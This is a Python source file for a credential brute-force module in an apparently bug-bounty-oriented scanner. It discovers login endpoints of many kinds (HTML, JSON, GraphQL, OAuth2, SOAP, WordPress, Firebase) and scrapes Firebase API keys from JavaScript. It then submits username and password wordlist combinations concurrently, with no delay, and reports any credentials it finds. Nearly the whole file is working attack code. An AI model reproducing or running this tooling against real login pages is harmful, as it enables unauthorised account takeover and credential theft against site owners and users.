import asyncio
import sys
from typing import List, Dict, Optional, Tuple, Set
from core.base_module import BaseModule, Finding
from pathlib import Path


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities - CONCURRENT NO-DELAY VERSION"""

    FORM_TYPE_REGISTRY = {
        'html_form':      {'description': 'Classic HTML form with POST',                     'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
        'json_api':       {'description': 'REST endpoint that accepts JSON body',             'content_type': 'application/json',                  'method': 'POST'},
        'graphql':        {'description': 'GraphQL mutation for login',                       'content_type': 'application/json',                  'method': 'POST'},
        'oauth2':         {'description': 'OAuth2 password-grant or token endpoint',          'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
        'basic_auth':     {'description': 'HTTP Basic Authentication (Authorization header)', 'content_type': None,                                'method': 'GET'},
        'xml_soap':       {'description': 'SOAP/XML web-service login',                       'content_type': 'text/xml',                          'method': 'POST'},
        'multipart_form': {'description': 'HTML multipart/form-data (file-upload forms)',     'content_type': 'multipart/form-data',               'method': 'POST'},
        'jwt_login':      {'description': 'Endpoint that issues a JWT on login',              'content_type': 'application/json',                  'method': 'POST'},
        'ajax_form':      {'description': 'AJAX-driven login (XMLHttpRequest / fetch)',       'content_type': 'application/json',                  'method': 'POST'},
        'wordpress':      {'description': 'WordPress wp-login.php form',                      'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
        'digest_auth':    {'description': 'HTTP Digest Authentication',                       'content_type': None,                                'method': 'GET'},
    }

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts    = config.get('max_attempts', 1000)
        self.delay           = 0
        self.wordlist_path   = config.get('wordlist_path', 'wordlists')
        self.concurrency     = config.get('concurrency', 50)
        # ── Custom wordlist overrides ──────────────────────────────────────────
        # Pass via config:  {'userlist': '/path/users.txt', 'passlist': '/path/rockyou.txt'}
        # Or via CLI flags: --userlist /path/users.txt  --passlist /path/rockyou.txt
        self.custom_userlist  = config.get('userlist', None)
        self.custom_passlist  = config.get('passlist', None)
        # Max entries read from each wordlist — keeps attempts manageable
        # Raise these via config if you need a deeper search
        self._max_usernames   = config.get('max_usernames', 200)
        self._max_passwords   = config.get('max_passwords', 2000)

    # ─────────────────────────────────────────────────────────────────────────
    # Progress bar (pure terminal, no extra dependencies)
    # ─────────────────────────────────────────────────────────────────────────
    def _print_progress(self, current: int, total: int, prefix: str = 'Progress', width: int = 40):
        """
        Print an in-place progress bar.
        Example:  Progress: [████████████░░░░░░░░░░░░░░] 45.2%  4520/10000
        """
        if total == 0:
            return
        pct   = current / total
        filled = int(width * pct)
        bar   = '█' * filled + '░' * (width - filled)
        line  = f'\r\033[96m{prefix}:\033[0m [{bar}] \033[93m{pct*100:5.1f}%\033[0m  {current}/{total}'
        sys.stdout.write(line)
        sys.stdout.flush()
        if current >= total:
            sys.stdout.write('\n')
            sys.stdout.flush()

    # ─────────────────────────────────────────────────────────────────────────
    # Entry point
    # ─────────────────────────────────────────────────────────────────────────
    async def run(self, target: str, **kwargs) -> List[Finding]:
        """Run brute force — inserts username+password into the login form and submits"""
        self.logger.info(f"Starting brute force on {target}")

        if not kwargs.get('enable_brute_force', False):
            self.logger.info("Brute force testing disabled (use --enable-brute-force to enable)")
            return self.findings

        # ── Pull custom wordlists / caps from kwargs ──────────────────────────
        if kwargs.get('userlist'):      self.custom_userlist = kwargs['userlist']
        if kwargs.get('passlist'):      self.custom_passlist = kwargs['passlist']
        if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
        if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']

        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"

        # ── Step 1: fetch the page and extract form fields ────────────────────
        print(f"\033[96m[*] Probing login page...\033[0m")
        endpoint = await self._probe_single_endpoint(target_url)

        print(f"\033[96m[*] Form type : \033[93m{endpoint['form_type']}\033[0m")
        print(f"\033[96m[*] Post URL  : \033[93m{endpoint['url']}\033[0m")
        print(f"\033[96m[*] User field: \033[93m{endpoint['fields'].get('username_field')}\033[0m")
        print(f"\033[96m[*] Pass field: \033[93m{endpoint['fields'].get('password_field')}\033[0m")

        # ── Step 2: show wordlist banner ──────────────────────────────────────
        ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt (default)"
        plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt (default)"
        print(f"\033[96m[*] Userlist  : {ulist_label}\033[0m")
        print(f"\033[96m[*] Passlist  : {plist_label}\033[0m\n")

        if endpoint.get('form_type') == 'firebase_key_missing':
            return self.findings

        await self._test_brute_force(endpoint)
        return self.findings

    # ─────────────────────────────────────────────────────────────────────────
    # Single fast probe — detects form type INCLUDING Firebase / SPA apps
    # ─────────────────────────────────────────────────────────────────────────
    async def _probe_single_endpoint(self, url: str) -> Dict:
        """
        Fetch the login page, extract the real form fields and POST url.
        Works for:
          - Standard HTML forms  → reads <form action=...> and <input name=...>
          - Firebase / SPA apps  → detects identitytoolkit and uses email+password
          - JSON APIs            → detects content-type and uses json body
        Falls back to email+password POST if detection fails.
        """
        import re
        from urllib.parse import urlparse, urljoin

        parsed = urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        default_fields = {
            'username_fields': ['email'],
            'password_field':  'password',
            'username_field':  'email',
            'email_field':     'email',
            'inputs': [], 'action': '', 'method': 'POST',
        }

        # ── Firebase URL passed directly ──────────────────────────────────────
        if 'identitytoolkit.googleapis.com' in url:
            print(f"\033[92m[+] Firebase Identity Toolkit URL — using JSON mode\033[0m")
            return {
                'url': url, 'type': 'firebase', 'form_type': 'firebase',
                'fields': default_fields, 'is_api': True,
            }

        # ── Fetch the page ────────────────────────────────────────────────────
        text    = ""
        headers = {}
        try:
            resp = await self._make_request(url)
            if resp:
                text    = await resp.text()
                headers = resp.headers
        except Exception as e:
            self.logger.warning(f"Probe failed: {e}")

        # ── Firebase SPA detection ────────────────────────────────────────────
        firebase_hints = ['firebase', 'identitytoolkit', 'firebaseapp', 'firebaseConfig', 'apiKey']
        is_firebase    = ('web.app' in url or 'firebaseapp.com' in url or
                          any(h in text for h in firebase_hints))

        if is_firebase:
            # Try to extract API key from page source
            key_m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{20,})', text)
            if not key_m:
                # Scan linked JS bundles
                js_srcs = re.findall(r'src=["\'](https?://[^"\']+\.js[^"\']*|/[^"\']+\.js[^"\']*)["\']', text)
                print(f"\033[96m[*] Scanning {len(js_srcs)} JS bundle(s) for Firebase config...\033[0m")
                for src in js_srcs[:8]:
                    js_url = src if src.startswith('http') else base + src
                    try:
                        jr = await self._make_request(js_url)
                        if jr:
                            jt   = await jr.text()
                            key_m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{20,})', jt)
                            if key_m:
                                print(f"\033[92m[+] Found Firebase API key in {src.split('/')[-1]}\033[0m")
                                break
                    except Exception:
                        pass

            if key_m:
                fb_url = (f"https://identitytoolkit.googleapis.com/v1/"
                          f"accounts:signInWithPassword?key={key_m.group(1)}")
                print(f"\033[92m[+] Firebase endpoint ready\033[0m")
                return {
                    'url': fb_url, 'type': 'firebase', 'form_type': 'firebase',
                    'fields': default_fields, 'is_api': True,
                }
            else:
                # Key not found — instruct user and return sentinel
                print(f"\033[91m[!] Firebase detected but API key not found in page/JS.\033[0m")
                print(f"\033[93m  Do this in Chrome DevTools (F12 → Network tab):\033[0m")
                print(f"\033[93m  1. Click \'Start recording\'\033[0m")
                print(f"\033[93m  2. Submit the login form with any credentials\033[0m")
                print(f"\033[93m  3. Find the request to identitytoolkit.googleapis.com\033[0m")
                print(f"\033[93m  4. Copy its full URL and use that as -t target\033[0m")
                return {
                    'url': url, 'type': 'firebase_key_missing',
                    'form_type': 'firebase_key_missing',
                    'fields': default_fields, 'is_api': False,
                }

        # ── Extract HTML form fields ───────────────────────────────────────────
        fields = self._extract_form_fields(text) if text else default_fields

        # Resolve form action URL
        post_url = url
        if fields.get('action'):
            action = fields['action']
            if action.startswith('http'):
                post_url = action
            elif action.startswith('/'):
                post_url = base + action
            else:
                post_url = urljoin(url, action)

        # Detect form type (json api, graphql, etc)
        ft = self._detect_form_type(url, text, headers)

        return {
            'url': post_url, 'type': 'direct', 'form_type': ft,
            'fields': fields, 'is_api': ft in ('json_api','graphql','oauth2','jwt_login','ajax_form'),
        }


    # ─────────────────────────────────────────────────────────────────────────
    # Discovery (kept for compatibility — no longer called in run())
    # ─────────────────────────────────────────────────────────────────────────
    async def _discover_login_forms(self, target: str) -> List[Dict]:
        """Discover login endpoints using multiple strategies"""
        import re
        endpoints = []
        seen_urls: Set[str] = set()

        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"

        from urllib.parse import urlparse, urljoin
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        candidate_urls = [target]
        common_paths = [
            '/login', '/signin', '/auth', '/authenticate',
            '/admin', '/admin/login', '/user/login', '/account/login',
            '/api/login', '/api/auth', '/api/token', '/oauth/token',
            '/api/v1/login', '/api/v2/login', '/api/v1/auth', '/api/v2/auth',
            '/api/v1/token', '/api/v2/token',
            '/graphql', '/api/graphql',
            '/rest/login', '/json/login', '/ajax/login',
            '/wp-login.php', '/administrator/index.php',
            '/admin.html', '/login.html', '/signin.html',
            '/auth/login', '/user/signin', '/member/login',
            '/dashboard/login', '/manage/login', '/control/login',
            '/auth/token', '/oauth/authorize', '/connect/token',
            '/identity/connect/token',
            '/service', '/services', '/ws', '/soap',
        ]
        for path in common_paths:
            candidate_urls.append(base + path)

        if parsed.query:
            candidate_urls.append(target)

        for url in candidate_urls:
            if url in seen_urls:
                continue
            seen_urls.add(url)
            try:
                response = await self._make_request(url)
                if not response:
                    continue
                if response.status not in [200, 301, 302, 401, 403, 405, 500]:
                    continue
                text = await response.text()
                if not text:
                    continue

                form_type = self._detect_form_type(url, text, response.headers)
                indicators = ['password','login','username','email','sign in','log in',
                              'signin','passwd','credentials','authentication','auth','token','session','oauth','sso']
                has_login_indicators = any(ind in text.lower() for ind in indicators)
                fields  = self._extract_form_fields(text)
                is_api  = 'application/json' in response.headers.get('Content-Type','') or text.strip().startswith(('{','['))
                js_fws  = ['react','vue','angular','ember','next.js','nuxt']
                has_js  = any(fw in text.lower() for fw in js_fws)
                is_http_auth = response.status == 401 and 'WWW-Authenticate' in response.headers

                if has_login_indicators or fields['inputs'] or is_api or has_js or is_http_auth or form_type != 'html_form':
                    from urllib.parse import urljoin
                    post_url = url
                    if fields.get('action'):
                        action = fields['action']
                        post_url = action if action.startswith('http') else (base + action if action.startswith('/') else urljoin(url, action))

                    endpoints.append({
                        'url': post_url, 'type': 'api' if is_api else ('js_framework' if has_js else 'form'),
                        'form_type': form_type, 'fields': fields, 'discovered_at': url,
                        'indicators_found': has_login_indicators, 'is_api': is_api,
                        'is_http_auth': is_http_auth,
                        'www_authenticate': response.headers.get('WWW-Authenticate',''),
                    })
                    self.logger.info(f"Found login endpoint: {post_url} (form_type={form_type})")
            except Exception as e:
                self.logger.debug(f"Login discovery error on {url}: {e}")

        seen: Set[str] = set()
        unique = []
        for ep in endpoints:
            if ep['url'] not in seen:
                seen.add(ep['url'])
                unique.append(ep)
        return unique

    # ─────────────────────────────────────────────────────────────────────────
    # Form-type detection
    # ─────────────────────────────────────────────────────────────────────────
    def _detect_form_type(self, url: str, html: str, headers) -> str:
        import re
        url_lower  = url.lower()
        html_lower = html.lower() if html else ''
        ct         = headers.get('Content-Type', '').lower() if headers else ''
        www_auth   = headers.get('WWW-Authenticate', '').lower() if headers else ''

        if 'digest' in www_auth:                                                  return 'digest_auth'
        if 'basic'  in www_auth:                                                  return 'basic_auth'
        if any(h in url_lower for h in ['/soap','/ws/','/wsdl','/service','/services']) \
           or any(h in html_lower for h in ['<soap:','wsdl','xmlns:soap','soapenv:']) \
           or 'xml' in ct:                                                        return 'xml_soap'
        if 'wp-login' in url_lower or ('wordpress' in html_lower and 'log in' in html_lower): return 'wordpress'
        if any(h in url_lower for h in ['/graphql','/gql','/graph']) \
           or any(h in html_lower for h in ['__schema','mutation','query{','query {','graphql']): return 'graphql'
        if any(h in url_lower for h in ['/oauth','/token','/connect/token','/identity/connect']) \
           or any(h in html_lower for h in ['grant_type','client_id','client_secret','access_token','oauth']): return 'oauth2'
        if any(h in url_lower for h in ['/jwt','/api/token','/api/auth','/api/login']) \
           or any(h in html_lower for h in ['access_token','refresh_token','jwt','bearer']):  return 'jwt_login'
        if 'multipart' in html_lower or re.search(r'enctype=["\']multipart', html_lower):    return 'multipart_form'
        if any(h in html_lower for h in ['xmlhttprequest','fetch(','axios','$.ajax','$.post','x-requested-with','json.stringify']): return 'ajax_form'
        if 'application/json' in ct or html.strip().startswith(('{','[')) \
           or any(h in url_lower for h in ['/api/','/rest/']):                    return 'json_api'
        return 'html_form'

    # ─────────────────────────────────────────────────────────────────────────
    # Payload builders
    # ─────────────────────────────────────────────────────────────────────────
    def _build_payload(self, form_type, username, password, username_fields, password_field):
        result = {'data': {}, 'headers': {}, 'method': 'POST', 'use_json': False,
                  'use_basic_auth': False, 'basic_auth_tuple': None}

        if form_type == 'html_form':
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        elif form_type == 'json_api':
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload; result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        elif form_type == 'graphql':
            ufield = username_fields[0] if username_fields else 'email'
            mutation = (f'mutation {{ login({ufield}: "{username}", {password_field}: "{password}") '
                        f'{{ token user {{ id email }} }} }}')
            result['data'] = {'query': mutation}; result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        elif form_type == 'oauth2':
            result['data'] = {'grant_type':'password','username':username,'password':password,'scope':'openid profile email'}
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        elif form_type in ('basic_auth', 'digest_auth'):
            result['use_basic_auth'] = True; result['basic_auth_tuple'] = (username, password)
            result['method'] = 'GET'

        elif form_type == 'xml_soap':
            result['data'] = (
                '<?xml version="1.0" encoding="utf-8"?>'
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                '<soap:Body><Login xmlns="http://tempuri.org/">'
                f'<username>{username}</username><password>{password}</password>'
                '</Login></soap:Body></soap:Envelope>')
            result['headers']['Content-Type'] = 'text/xml; charset=utf-8'
            result['headers']['SOAPAction']   = '"Login"'

        elif form_type == 'multipart_form':
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload
            result['headers']['Content-Type'] = 'multipart/form-data'

        elif form_type in ('jwt_login', 'ajax_form'):
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload; result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'
            if form_type == 'ajax_form':
                result['headers']['X-Requested-With'] = 'XMLHttpRequest'

        elif form_type == 'wordpress':
            result['data'] = {'log': username, 'pwd': password, 'wp-submit': 'Log In',
                              'redirect_to': '/wp-admin/', 'testcookie': '1'}
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
            result['headers']['Cookie']       = 'wordpress_test_cookie=WP+Cookie+check'

        elif form_type == 'firebase':
            # Firebase REST API: POST JSON with email + password fields
            result['data']     = {'email': username, 'password': password, 'returnSecureToken': True}
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        else:
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        return result

    # ─────────────────────────────────────────────────────────────────────────
    # Field extraction
    # ─────────────────────────────────────────────────────────────────────────
    def _extract_form_fields(self, html: str) -> Dict:
        import re
        fields = {'inputs': [], 'username_fields': [], 'password_field': None, 'action': '', 'method': 'POST'}
        if not html:
            return fields

        inputs    = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE)
        js_inputs = re.findall(r'name["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
        for pattern in [r'["\'](email|username|user|login|name)["\']',
                        r'["\'](password|passwd|pwd|pass)["\']',
                        r'["\'](token|auth|session)["\']']:
            inputs.extend(re.findall(pattern, html, re.IGNORECASE))
        fields['inputs'] = list(set(inputs + js_inputs))

        action_m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if action_m: fields['action'] = action_m.group(1)
        method_m = re.search(r'<form[^>]+method=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if method_m: fields['method'] = method_m.group(1).upper()

        u_patterns = ['email','mail','e-mail','username','user','uname','login','name',
                      'account','userid','user_id','auth_user','identity','identifier','phone','mobile','cell']
        p_patterns = ['password','passwd','pwd','pass','user_password','auth_pass','secret','key','credential']

        for inp in fields['inputs']:
            for pat in u_patterns:
                if pat in inp.lower() and inp not in fields['username_fields']:
                    fields['username_fields'].append(inp); break

        for inp in fields['inputs']:
            for pat in p_patterns:
                if pat in inp.lower():
                    fields['password_field'] = inp; break
            if fields['password_field']: break

        if not fields['username_fields']:
            hl = html.lower()
            if 'email' in hl or 'e-mail' in hl: fields['username_fields'] = ['email','username','user']
            elif 'username' in hl:               fields['username_fields'] = ['username','email','user']
            else:                                fields['username_fields'] = ['email','username','user','login','name']
        if not fields['password_field']:         fields['password_field']  = 'password'

        fields['username_field'] = fields['username_fields'][0]
        fields['email_field']    = fields['username_fields'][0]
        return fields

    # ─────────────────────────────────────────────────────────────────────────
    # Wordlist loader  — now respects custom_userlist / custom_passlist
    # ─────────────────────────────────────────────────────────────────────────
    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        """
        Load usernames and passwords.

        Priority order
        ──────────────
        1. self.custom_userlist / self.custom_passlist  (--userlist / --passlist CLI flags)
        2. wordlists/usernames.txt  /  wordlists/passwords.txt  (default paths)
        3. Built-in fallback mini-lists
        """
        usernames: List[str] = []
        passwords: List[str] = []

        # ── Hard caps — prevents billion-attempt hangs ─────────────────────
        # Raise via CLI config if you need more:  --max-usernames 500 --max-passwords 5000
        MAX_U = getattr(self, '_max_usernames', 200)
        MAX_P = getattr(self, '_max_passwords', 2000)

        def _load_capped(path, label, cap):
            lines = []
            with open(path, 'r', errors='ignore') as fh:
                for line in fh:
                    s = line.strip()
                    if s:
                        lines.append(s)
                    if len(lines) >= cap:
                        break
            flag = f' \033[91m(capped — use --max-{label.split()[0].lower()}s N to raise)\033[0m' if len(lines) == cap else ''
            print(f"\033[92m[+] {label}: {path} ({len(lines)} entries{flag})\033[0m")
            return lines

        # ── Resolve paths from CWD (where the user runs raptor.py from) ────
        import os
        cwd = Path(os.getcwd())   # always ~/raptor when run as: python3 raptor.py

        def _resolve(raw_path: str) -> Optional[Path]:
            """Return the first existing Path, trying cwd-relative first."""
            candidates = [
                Path(raw_path),           # absolute path  /home/...
                cwd / raw_path,           # relative to ~/raptor  ← most common
                Path(raw_path).expanduser(),
            ]
            for c in candidates:
                try:
                    if c.exists():
                        return c.resolve()
                except Exception:
                    pass
            return None

        # ── Usernames ─────────────────────────────────────────
        if self.custom_userlist:
            upath = _resolve(self.custom_userlist)
            if upath:
                usernames = _load_capped(upath, 'Custom userlist', MAX_U)
            else:
                print(f"\033[91m[!] Userlist not found: '{self.custom_userlist}'\033[0m")
                print(f"\033[91m    Make sure the file exists at: {cwd / self.custom_userlist}\033[0m")

        if not usernames:
            upath = _resolve(str(Path(self.wordlist_path) / 'usernames.txt'))
            if upath:
                usernames = _load_capped(upath, 'Userlist (default)', MAX_U)
            else:
                usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
                print(f"\033[93m[!] No userlist found — using {len(usernames)} built-in defaults\033[0m")

        # ── Passwords ─────────────────────────────────────────
        if self.custom_passlist:
            ppath = _resolve(self.custom_passlist)
            if ppath:
                passwords = _load_capped(ppath, 'Custom passlist', MAX_P)
            else:
                print(f"\033[91m[!] Passlist not found: '{self.custom_passlist}'\033[0m")
                print(f"\033[91m    Make sure the file exists at: {cwd / self.custom_passlist}\033[0m")

        if not passwords:
            ppath = _resolve(str(Path(self.wordlist_path) / 'passwords.txt'))
            if ppath:
                passwords = _load_capped(ppath, 'Passlist (default)', MAX_P)
            else:
                passwords = ['admin', 'password', '123456', 'login', 'admin123']
                print(f"\033[93m[!] No passlist found — using {len(passwords)} built-in defaults\033[0m")

        print()
        return usernames, passwords

    def _generate_username_variations(self, base_usernames: List[str]) -> Set[str]:
        variations: Set[str] = set()
        for username in base_usernames:
            variations.add(username)
            if '@' in username:
                local = username.split('@')[0]
                variations.add(local)
                variations.add(local + '@email.com')
                variations.add(local + '@gmail.com')
            else:
                variations.add(username + '@email.com')
                variations.add(username + '@gmail.com')
                variations.add(username + '@admin.com')
        return variations

    # ─────────────────────────────────────────────────────────────────────────
    # Core brute-force loop — concurrent with live progress bar
    # ─────────────────────────────────────────────────────────────────────────
    async def _test_brute_force(self, endpoint: Dict):
        """Concurrent brute force with live progress bar."""
        import itertools
        import aiohttp

        if endpoint.get('form_type') == 'firebase_key_missing':
            return

        url        = endpoint['url']
        form_type  = endpoint.get('form_type', 'html_form')
        fields     = endpoint.get('fields', {})
        ufields    = fields.get('username_fields', ['email'])
        pfield     = fields.get('password_field', 'password')

        base_usernames, passwords = self._load_wordlists()
        all_usernames  = list(dict.fromkeys(base_usernames))
        total_attempts = len(all_usernames) * len(passwords)

        print(f"\033[96m[*] Usernames  : {len(all_usernames)}\033[0m")
        print(f"\033[96m[*] Passwords  : {len(passwords)}\033[0m")
        print(f"\033[96m[*] Total      : {total_attempts}\033[0m")
        print(f"\033[96m[*] Workers    : {self.concurrency}\033[0m\n")

        semaphore   = asyncio.Semaphore(self.concurrency)
        found_event = asyncio.Event()
        counter     = [0]
        rate_limited = [False]

        async def attempt(username: str, password: str):
            if found_event.is_set():
                return
            async with semaphore:
                if found_event.is_set():
                    return
                try:
                    # ── Build request ─────────────────────────────────────
                    if form_type == 'firebase':
                        body    = {'email': username, 'password': password, 'returnSecureToken': True}
                        req_kw  = {'json': body}
                        hdrs    = {'Content-Type': 'application/json'}
                    elif form_type in ('json_api', 'jwt_login', 'ajax_form'):
                        body    = {pfield: password}
                        for f in ufields: body[f] = username
                        req_kw  = {'json': body}
                        hdrs    = {'Content-Type': 'application/json'}
                    else:
                        body    = {pfield: password}
                        for f in ufields: body[f] = username
                        req_kw  = {'data': body}
                        hdrs    = {'Content-Type': 'application/x-www-form-urlencoded'}

                    # ── Send request directly via aiohttp ─────────────────
                    timeout = aiohttp.ClientTimeout(total=15)
                    async with aiohttp.ClientSession(timeout=timeout) as session:
                        async with session.post(url, headers=hdrs,
                                                ssl=False, allow_redirects=False,
                                                **req_kw) as resp:
                            status  = resp.status
                            text    = await resp.text()
                            resp_hdrs = resp.headers

                    counter[0] += 1
                    self._print_progress(counter[0], total_attempts,
                                         prefix=f'  \033[96m{username[:22]:<22}\033[0m')

                    # ── Always show response on first attempt for debugging ─
                    if counter[0] == 1:
                        sys.stdout.write('\n')
                        print(f"\033[90m[debug] HTTP {status} | {text[:200]}\033[0m\n")

                    # ── Rate limit ────────────────────────────────────────
                    if status == 429:
                        rate_limited[0] = True
                        found_event.set()
                        return

                    # ── Success detection ─────────────────────────────────
                    tl = text.lower()

                    # Firebase success: contains idToken
                    if any(k in tl for k in ['idtoken', 'localid', 'refreshtoken']):
                        sys.stdout.write('\n')
                        self._report_success(username, password, url, counter[0], ufields, pfield)
                        found_event.set()
                        return

                    # Redirect to dashboard
                    if status in [301, 302, 303, 307, 308]:
                        loc = resp_hdrs.get('Location', '').lower()
                        if any(p in loc for p in ['/dashboard','/admin','/home','/panel','/welcome']):
                            sys.stdout.write('\n')
                            self._report_success(username, password, url, counter[0], ufields, pfield)
                            found_event.set()
                            return

                    # JSON token response
                    if 'application/json' in resp_hdrs.get('Content-Type',''):
                        if any(k in tl for k in ['access_token','auth_token','"token"']) and '"error"' not in tl:
                            sys.stdout.write('\n')
                            self._report_success(username, password, url, counter[0], ufields, pfield)
                            found_event.set()
                            return

                    # Session cookie set
                    cookie = resp_hdrs.get('Set-Cookie','').lower()
                    if status == 200 and any(c in cookie for c in ['session','token','auth','jwt']):
                        fail_words = ['invalid','incorrect','failed','wrong','denied','error']
                        if not any(f in tl for f in fail_words):
                            sys.stdout.write('\n')
                            self._report_success(username, password, url, counter[0], ufields, pfield)
                            found_event.set()

                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    counter[0] += 1
                    sys.stdout.write('\n')
                    print(f"\033[91m[error] {username}:{password} → {e}\033[0m")

        tasks = [asyncio.create_task(attempt(u, p))
                 for u, p in itertools.product(all_usernames, passwords)]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            for t in tasks: t.cancel()
            sys.stdout.write('\n')
            print(f"\033[93m[!] Interrupted after {counter[0]} attempts\033[0m")
            return

        sys.stdout.write('\n')
        if rate_limited[0]:
            self._add_rate_limit_finding(url, counter[0])
        elif not found_event.is_set():
            print(f"\033[93m[-] No credentials found after {counter[0]} attempts\033[0m")


    # ─────────────────────────────────────────────────────────────────────────
    # Rate-limit test (kept for compatibility — not called in run())
    # ─────────────────────────────────────────────────────────────────────────
    async def _test_rate_limiting(self, endpoint: Dict):
        url = endpoint['url']
        responses = []
        self.logger.info(f"Testing rate limiting on {url} (no delay)")
        for i in range(min(5, self.max_attempts)):
            try:
                response = await self._make_request(
                    url, method='POST',
                    data={'username': f'test{i}@test.com', 'password': 'wrong123'})
                if response:
                    responses.append(response.status)
            except:
                responses.append('error')

        if 429 in responses or 503 in responses or 403 in responses:
            self.logger.info(f"Rate limiting detected on {url}")
        else:
            self.add_finding(Finding(
                module='brute_force', title='Missing Rate Limiting on Authentication',
                severity='High',
                description=f'No rate limiting on {url} after {len(responses)} rapid requests',
                evidence={'endpoint': url, 'requests': len(responses), 'responses': responses},
                poc=f"Send rapid login requests to {url}",
                remediation='Implement rate limiting (max 5 attempts per IP per 15 minutes)',
                cvss_score=7.5, bounty_score=1000, target=url))

    # ─────────────────────────────────────────────────────────────────────────
    # Success detection
    # ─────────────────────────────────────────────────────────────────────────
    async def _check_login_success(self, response, url: str) -> bool:
        try:
            status = response.status
            if status in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if location:
                    if any(p in location.lower() for p in ['/dashboard','/admin','/home','/profile','/welcome','/panel','/main']):
                        return True
                    if any(p in location.lower() for p in ['/login','/signin','/error','/fail','/denied']):
                        return False
            if status == 200:
                text = await response.text()
                tl   = text.lower()
                for f in ['invalid','incorrect','failed','error','wrong','denied','unauthorized','try again']:
                    if f in tl: return False
                success_count = sum(1 for s in ['welcome','dashboard','logout','profile','admin panel','successful','session','token'] if s in tl)
                cookies = response.headers.get('Set-Cookie','').lower()
                if any(c in cookies for c in ['session','token','auth','jwt']): return True
                if success_count >= 2: return True
            if status in [200,201] and 'application/json' in response.headers.get('Content-Type',''):
                text = await response.text()
                if any(k in text.lower() for k in ['token','access_token','auth_token','session']): return True
            if status == 200 and response.headers.get('WWW-Authenticate'): return True
            return False
        except Exception as e:
            self.logger.error(f"Error checking success: {e}")
            return False

    # ─────────────────────────────────────────────────────────────────────────
    # Reporting
    # ─────────────────────────────────────────────────────────────────────────
    def _report_success(self, username, password, url, attempts, username_fields, password_field):
        sep = "=" * 60
        print(f"\n\033[91m{sep}\033[0m")
        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
        print(f"\033[92m      Username : {username}\033[0m")
        print(f"\033[92m      Password : {password}\033[0m")
        print(f"\033[92m      URL      : {url}\033[0m")
        print(f"\033[92m      Attempts : {attempts}\033[0m")
        print(f"\033[91m{sep}\033[0m\n")
        self.add_finding(Finding(
            module='brute_force',
            title=f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
            severity='Critical',
            description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
            evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
            poc=f"curl -X POST '{url}' -d '{username_fields[0]}={username}&{password_field}={password}'",
            remediation='Implement strong password policy, rate limiting, and account lockout',
            cvss_score=9.8, bounty_score=5000, target=url))

    def _add_rate_limit_finding(self, url, attempts):
        self.add_finding(Finding(
            module='brute_force', title='Rate Limiting Detected During Brute Force',
            severity='Info',
            description=f'Rate limiting triggered after {attempts} attempts',
            evidence={'attempts': attempts, 'url': url},
            poc=f"Send {attempts} login requests to {url}",
            remediation='Rate limiting is working correctly',
            cvss_score=0.0, bounty_score=0, target=url))
